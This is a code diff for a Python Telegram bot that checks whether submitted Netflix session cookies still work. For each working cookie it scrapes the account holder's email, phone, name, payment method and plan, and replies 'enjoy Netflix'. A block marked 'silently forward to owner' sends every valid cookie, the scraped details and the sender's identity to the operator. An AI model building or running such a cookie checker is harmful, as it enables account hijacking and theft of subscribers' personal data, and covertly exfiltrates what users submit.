@@ -1,33 +1,49 @@
+#!/usr/bin/env python3
 import os
+import io
 import json
+import zipfile
+import logging
 import requests
+import re
+from datetime import datetime, timezone
+
+import pycountry
+import langcodes
 from dotenv import load_dotenv
-from telegram import Update, Document
-from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters
+from telegram import Update, Document, InputFile
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    MessageHandler,
+    filters,
+    ContextTypes,
+)
 
+# Load environment variables
 load_dotenv()
+TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
+OWNER_CHAT_ID = os.getenv("OWNER_CHAT_ID")
+if not TELEGRAM_TOKEN or not OWNER_CHAT_ID:
+    logging.error("Please set TELEGRAM_TOKEN and OWNER_CHAT_ID in your .env")
+    exit(1)
+OWNER_CHAT_ID = int(OWNER_CHAT_ID)
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN")
-OWNER_CHAT_ID = os.environ.get("OWNER_CHAT_ID")
-if not BOT_TOKEN or not OWNER_CHAT_ID:
-    raise ValueError("BOT_TOKEN and OWNER_CHAT_ID environment variables must be set in .env file.")
-try:
-    OWNER_CHAT_ID = int(OWNER_CHAT_ID)
-except ValueError:
-    raise ValueError("OWNER_CHAT_ID must be an integer.")
-
-NETFLIX_BROWSE_URL = "https://www.netflix.com/browse"
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 def parse_cookies(file_content: str, file_type: str) -> dict:
-    """Parse cookies from JSON or Netscape formats (including HttpOnly lines)."""
     if file_type.lower() == 'json' or file_content.lstrip().startswith('['):
         try:
-            data = json.loads(file_content)
-            if isinstance(data, list):
-                return {c["name"]: c["value"] for c in data if "name" in c and "value" in c}
+            arr = json.loads(file_content)
+            if isinstance(arr, list):
+                return {
+                    c['name']: c['value']
+                    for c in arr
+                    if isinstance(c, dict) and 'name' in c and 'value' in c
+                }
         except json.JSONDecodeError:
             pass
-
     cookies = {}
     for line in file_content.splitlines():
         line = line.strip()
@@ -38,85 +54,260 @@ def parse_cookies(file_content: str, file_type: str) -> dict:
         parts = line.split('\t')
         if len(parts) >= 7:
             cookies[parts[5]] = parts[6]
+    if not cookies and file_content.strip():
+        for pair in file_content.split(';'):
+            pair = pair.strip()
+            if '=' in pair:
+                name, value = pair.split('=', 1)
+                cookies[name] = value
     return cookies
+
+def extract_netflix_account_info(html: str) -> str | None:
+    tp = re.search(
+        r'"thirdPartyBillingPartner"\s*:\s*{[^}]*"value"\s*:\s*(true|false)',
+        html
+    )
+    if tp and tp.group(1).lower() == 'true':
+        pm = re.search(
+            r'"paymentMethod"\s*:\s*{[^}]*"value"\s*:\s*"([^" ]+)"',
+            html
+        )
+        if pm:
+            method = pm.group(1).replace('_', ' ').upper()
+            return (
+                "Account info\n"
+                "Billed: Third party\n"
+                f"Using: {method}"
+            )
+    pm = re.search(
+        r'"paymentMethods"\s*:\s*{.*?"value"\s*:\s*\[\s*{'
+        r'.*?"paymentMethod"\s*:\s*{[^}]*?"value"\s*:\s*"([^" ]+)"[^}]*}'
+        r'.*?"displayText"\s*:\s*{[^}]*?"value"\s*:\s*"([^\"]+)"',
+        html,
+        re.DOTALL
+    )
+    if pm:
+        pm_raw, display_raw = pm.group(1), pm.group(2)
+        type_m = re.search(
+            r'"type"\s*:\s*{[^}]*?"value"\s*:\s*"([^" ]+)"',
+            html
+        )
+        type_raw = type_m.group(1) if type_m else pm_raw
+        method  = pm_raw.replace('_', ' ').upper()
+        display = bytes(display_raw, 'utf-8').decode('unicode_escape').replace('*', '•')
+        using   = f"{type_raw.replace('_',' ').upper()} {display}"
+        return (
+            "Account info\n"
+            f"Billed: {method}\n"
+            f"Using: {using}"
+        )
+    return None
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "👋 Hi! Send me your Netflix‑cookies file(s) in .txt, .json, or .zip format, "
+        "and I’ll check whether they’re still valid."
+    )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc: Document = update.message.document
-    if not doc.file_name.lower().endswith(('.txt', '.json')):
-        return await update.message.reply_text(
-            "❌ Please upload a valid .txt or .json file.",
-            reply_to_message_id=update.message.message_id
-        )
+    orig_id = update.message.message_id
+    bot_user = context.bot.username
+    user = update.message.from_user
+    user_id = user.id
+    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
+    username_str = f"@{user.username}" if user.username else "N/A"
 
-    # download
+    # download into memory
     file = await doc.get_file()
-    file_path = f"/tmp/{doc.file_unique_id}"
-    await file.download_to_drive(file_path)
+    data = await file.download_as_bytearray()
+    buf = io.BytesIO(data)
 
-    try:
-        content = open(file_path, 'r', encoding='utf-8').read()
-        cookies = parse_cookies(content, doc.file_name.rsplit('.', 1)[-1])
-        if not cookies:
-            return await update.message.reply_text(
-                "❌ Invalid cookie format. Please ensure it's correct in JSON or Netscape format.",
-                reply_to_message_id=update.message.message_id
-            )
+    # determine extension and initialize files list
+    filename = doc.file_name
+    ext = os.path.splitext(filename)[1].lower()
+    files = []
 
-        resp = requests.get(NETFLIX_BROWSE_URL, headers={"User-Agent": "Mozilla/5.0"}, cookies=cookies)
-        if resp.status_code != 200 or resp.url.rstrip('/').lower() != NETFLIX_BROWSE_URL:
-            return await update.message.reply_text(
-                "❌ Netflix cookies are invalid or expired.",
-                reply_to_message_id=update.message.message_id
-            )
-
-        bot = context.bot
-        me = await bot.get_me()
-        ext = doc.file_name.rsplit('.', 1)[-1]
-        new_name = f"@{me.username} - {update.message.message_id}.{ext}"
-
-        with open(file_path, 'rb') as f:
-            await bot.send_document(
-                chat_id=update.effective_chat.id,
-                document=f,
-                filename=new_name,
-                caption=f"✅ This cookie is valid, checked via @{me.username}.",
-                reply_to_message_id=update.message.message_id,
-                parse_mode="Markdown"
-            )
-
-        sender = update.effective_user
-        owner_caption = f"[{sender.id}](tg://user?id={sender.id})\n{sender.full_name}"
-        if sender.username:
-            owner_caption += f"\n@{sender.username}"
-
-        with open(file_path, 'rb') as f2:
-            await bot.send_document(
-                chat_id=OWNER_CHAT_ID,
-                document=f2,
-                filename=doc.file_name,
-                caption=owner_caption,
-                parse_mode="Markdown"
-            )
-
-    except Exception as e:
-        await update.message.reply_text(
-            f"❌ Error processing file: {e}",
-            reply_to_message_id=update.message.message_id
+    if ext in ('.txt', '.json'):
+        text = buf.read().decode('utf-8', errors='ignore')
+        files.append((filename, text, ext.lstrip('.')))
+    elif ext == '.zip':
+        with zipfile.ZipFile(buf) as zf:
+            for zi in zf.infolist():
+                base = os.path.basename(zi.filename)
+                if zi.filename.startswith('__MACOSX/') or base.startswith('._'):
+                    continue
+                if zi.filename.lower().endswith(('.txt', '.json')):
+                    text = zf.read(zi).decode('utf-8', errors='ignore')
+                    files.append((zi.filename, text, zi.filename.split('.')[-1]))
+    else:
+        return await update.message.reply_text(
+            "⚠️ Unsupported file type. Please send .txt, .json or .zip.",
+            reply_to_message_id=orig_id
         )
-    finally:
-        if os.path.exists(file_path):
-            os.remove(file_path)
 
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "Hi! Send me your Netflix cookies file (.txt or .json) and I'll check it for you.",
-        reply_to_message_id=update.message.message_id
+    if not files:
+        return await update.message.reply_text(
+            "🚫 No .txt/.json cookie files found.",
+            reply_to_message_id=orig_id
+        )
+
+    for name, content, ftype in files:
+        context.application.create_task(
+            process_file(
+                chat_id=update.effective_chat.id,
+                orig_id=orig_id,
+                name=name,
+                content=content,
+                ftype=ftype,
+                bot_user=bot_user,
+                user_id=user_id,
+                full_name=full_name,
+                username_str=username_str,
+                context=context
+            )
+        )
+
+async def process_file(
+    chat_id: int,
+    orig_id: int,
+    name: str,
+    content: str,
+    ftype: str,
+    bot_user: str,
+    user_id: int,
+    full_name: str,
+    username_str: str,
+    context: ContextTypes.DEFAULT_TYPE
+):
+    cookies = parse_cookies(content, ftype)
+    if not cookies:
+        return await context.bot.send_message(
+            chat_id=chat_id,
+            text="⚠️ Cookie format is incorrect, please send correct cookie format",
+            reply_to_message_id=orig_id
+        )
+
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0"})
+    session.cookies.update(cookies)
+    try:
+        resp = session.get(
+            "https://www.netflix.com/account",
+            allow_redirects=True,
+            timeout=10
+        )
+        html = resp.text
+        valid = resp.url.startswith("https://www.netflix.com/account")
+    except Exception:
+        valid = False
+        html = ""
+
+    if valid:
+        info = extract_netflix_account_info(html)
+        billed_using = info.splitlines()[1:] if info else []
+
+        hold_m = re.search(r'"isUserOnHold"\s*:\s*(true|false)', html)
+        hold = hold_m.group(1).capitalize() if hold_m else None
+
+        pd_m = re.search(r'"localizedPlanName"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"', html)
+        plan = pd_m.group(1) if pd_m else None
+
+        ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html)
+        membership = ms_m.group(1).replace('_', ' ').title() if ms_m else None
+
+        co_m = re.search(r'"countryOfSignup"\s*:\s*"([A-Z]{2})"', html)
+        country = None
+        if co_m:
+            code = co_m.group(1)
+            country = f"({code}) {pycountry.countries.get(alpha_2=code).name}"
+
+        fn_m = re.search(r'"firstName"\s*:\s*"([^"]+)"', html)
+        name_val = fn_m.group(1) if fn_m else None
+
+        em_m = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', html)
+        mail = bytes(em_m.group(1), 'utf-8').decode('unicode_escape') if em_m else None
+
+        ph_m = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html)
+        phone = bytes(ph_m.group(1), 'utf-8').decode('unicode_escape') if ph_m else None
+
+        ms2_m = re.search(r'"memberSince"\s*:\s*{[^}]*"value"\s*:\s*(\d+)', html)
+        signup = None
+        if ms2_m:
+            ts = int(ms2_m.group(1)) / 1000.0
+            dt = datetime.fromtimestamp(ts, tz=timezone.utc)
+            signup = dt.strftime("%b %-d, %Y at %H:%M:%S UTC")
+
+        np_m = re.search(r'"nextBillingDate"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"', html)
+        next_pay = bytes(np_m.group(1), 'utf-8').decode('unicode_escape') if np_m else None
+
+        ems_m = re.search(r'"showExtraMemberSection"\s*:\s*{[^}]*"value"\s*:\s*(true|false)', html)
+        extra_slots = ems_m.group(1).capitalize() if ems_m else None
+
+        lang_m = re.search(r'"language"\s*:\s*"([a-z]{2})"', html)
+        display_lang = None
+        if lang_m:
+            display_lang = langcodes.Language.get(lang_m.group(1)).display_name()
+
+        section = ["Account Information:"]
+        section += billed_using
+        if country:      section.append(f"Country: {country}")
+        if membership:   section.append(f"Membership status: {membership}")
+        if hold is not None:
+            status = "Active" if hold == "False" else "On Hold"
+            section.append(f"Plan status: {status}")
+        if plan:         section.append(f"Plan details: {plan}")
+        if next_pay:     section.append(f"Next payment: {next_pay}")
+        if signup:       section.append(f"Signup D&T: {signup}")
+        if extra_slots:  section.append(f"Extra Member: {'Yes' if extra_slots=='True' else 'No'}")
+        if mail:         section.append(f"Mail: {mail}")
+        if phone:        section.append(f"Phone: {phone}")
+        if name_val:     section.append(f"Name: {name_val}")
+        if display_lang: section.append(f"Display Language: {display_lang}")
+
+        base_caption = f"✅  This cookie is working, enjoy Netflix 🍿. Checked by @{bot_user}"
+        full_caption = base_caption + "\n\n" + "\n".join(section)
+
+        # reply to user
+        bio = io.BytesIO(content.encode('utf-8'))
+        bio.seek(0)
+        new_name = f"@{bot_user}-{orig_id}.{ftype}"
+        input_file = InputFile(bio, filename=new_name)
+        await context.bot.send_document(
+            chat_id=chat_id,
+            document=input_file,
+            caption=full_caption,
+            reply_to_message_id=orig_id
+        )
+
+        # silently forward to owner
+        owner_caption = (
+            f"Chat ID: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
+            f"Full name: {full_name}\n"
+            f"Username: {username_str}\n\n"
+            + "\n".join(section)
+        )
+        await context.bot.send_document(
+            chat_id=OWNER_CHAT_ID,
+            document=input_file,
+            caption=owner_caption,
+            parse_mode='HTML'
+        )
+    else:
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text="❌  This cookie is invalid or expired",
+            reply_to_message_id=orig_id
+        )
+
+def main():
+    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(
+        MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_document)
     )
-
-if __name__ == '__main__':
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    app.add_handler(CommandHandler("start", start_command))
-
-    print("Bot is running...")
     app.run_polling()
+    logger.info("Bot started.")
+
+if __name__ == "__main__":
+    main()
